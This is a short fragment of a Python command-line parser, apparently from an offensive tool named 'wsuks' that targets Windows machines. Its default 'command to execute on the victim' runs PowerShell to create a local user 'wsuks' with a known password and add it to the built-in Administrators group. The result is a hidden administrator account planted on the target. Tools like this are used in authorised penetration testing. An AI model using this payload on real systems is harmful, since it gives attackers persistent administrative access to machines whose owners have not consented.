...
def initParser():
    ...
    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'New-LocalUser -Name "wsuks" -Password $(ConvertTo-SecureString "wsuks" -AsPlainText -Force) -Fullname "wsuks user" -Description "This user was generated by the wsuks Tool"; Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "wsuks"\'')
